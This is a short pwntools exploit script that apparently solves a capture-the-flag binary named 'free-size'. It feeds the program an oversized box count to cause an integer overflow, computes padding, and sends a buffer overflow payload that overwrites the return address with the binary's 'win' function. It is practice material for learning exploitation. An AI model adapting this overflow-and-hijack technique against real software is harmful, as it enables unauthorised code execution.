#!/usr/bin/env python3

from pwn import *
import re

chall = "../chall/free-size"
exe = ELF(chall)

context.binary = exe
context.terminal = ["tmux", "neww"]

""" context.log_level = "ERROR" """
io = process(chall)
""" io = remote("localhost", 5000) """

""" context.log_level = "INFO" """
limit = int(
    re.match(
        b"You rolled (\\d+) as",
        io.recvline()).group(1))
log.info(f"{limit=:#x}")

number = (2**41) >> (41 - 31)
size = 2 ** (41 - 31)

io.sendlineafter(b"boxes: ", str(number).encode("utf-8"))
io.sendlineafter(b"box: ", str(size).encode("utf-8"))

if limit & 0xf >= 0x9:
    pad = (limit + 0x10) & 0xfff0
else:
    pad = limit & 0xfff0

pad += 0x50

log.info(f"{pad=:#x}")

payload = b"A" * (pad + 0x8)
payload += p64(exe.symbols["win"])

io.sendlineafter(b"bytes\n", payload)
print(io.recvall(timeout=1))
io.close()

